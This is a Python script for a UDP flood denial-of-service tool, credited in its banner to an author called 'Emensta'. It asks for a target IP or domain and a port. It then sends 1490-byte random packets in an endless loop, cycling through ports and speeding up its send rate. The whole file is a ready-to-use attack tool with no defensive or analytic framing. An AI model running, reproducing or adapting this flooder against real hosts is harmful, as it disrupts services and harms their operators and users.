import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
attack_bytes = bytearray(random.getrandbits(8) for _ in range(1490))
#############

AMARILLO = "\033[93m"
BLANCO = "\033[97m"
CYAN = "\033[96m"
VERDE = "\033[92m"
ROJO = "\033[91m"
MAGENTA = "\033[95m"
RESET = "\033[0m"

def title():
    print(VERDE + banner + RESET)
    print(VERDE + "Distributed DDOS Attack -By Emensta" + RESET)
    print(VERDE + "-" * 67 + RESET)
    print("Author : Emensta")
    print("Github : https://github.com/EmenstaNougat")
    print(VERDE + "-" * 67 + RESET)

banner = """
    ____  ____       _____    ___   __  __             __  
   / __ \/ __ \____ / ___/   /   | / /_/ /_____ ______/ /__
  / / / / / / / __ \\__ \   / /| |/ __/ __/ __ `/ ___/ //_/
 / /_/ / /_/ / /_/ /__/ /  / ___ / /_/ /_/ /_/ / /__/ ,<   
/_____/_____/\____/____/  /_/  |_\__/\__/\__,_/\___/_/|_|  
"""

os.system("clear")
title()

ip = input(VERDE + "IP Target / Domain : " + RESET)
port = int(input(VERDE + "Port               : " + RESET))

os.system("clear")
print(VERDE + """
    ___   __  __             __      _____ __             __           __   __
   /   | / /_/ /_____ ______/ /__   / ___// /_____ ______/ /____  ____/ /  / /
  / /| |/ __/ __/ __ `/ ___/ //_/   \__ \/ __/ __ `/ ___/ __/ _ \/ __  /  / / 
 / ___ / /_/ /_/ /_/ / /__/ ,<     ___/ / /_/ /_/ / /  / /_/  __/ /_/ /  /_/  
/_/  |_\__/\__/\__,_/\___/_/|_|   /____/\__/\__,_/_/   \__/\___/\__,_/  (_)   
""" + RESET)

# Definir caracteres de la barra de progreso
progress_chars = ["[                    ]", "[#                   ]", "[##                  ]",
                  "[###                 ]", "[####                ]", "[#####               ]",
                  "[######              ]", "[#######             ]", "[########            ]",
                  "[#########           ]", "[##########          ]", "[###########         ]",
                  "[############        ]", "[#############       ]", "[##############      ]",
                  "[###############     ]", "[################    ]", "[#################   ]",
                  "[##################  ]", "[################### ]", "[####################]"]

for i, progress in enumerate(progress_chars):
    percentage = int((i + 1) / len(progress_chars) * 100)
    sys.stdout.write("\r" + progress.replace("[", "[" + VERDE).replace("]", RESET + "]") + f" {percentage}%")
    sys.stdout.flush()
    time.sleep(0.5)

time.sleep(3)

sent = 0

base_rate = 0.1
exponential_factor = 2

try:
    while True:
        sock.sendto(attack_bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print("Sent %s packet to %s through port:%s" % (sent, ip, port))
        if port == 65534:
            port = 1

        base_rate *= exponential_factor

        time.sleep(1 / base_rate)

except KeyboardInterrupt:
    print("\n" + ROJO + "[*] User interrupted the attack." + RESET)
except Exception as e:
    print(f"Error: {e}")
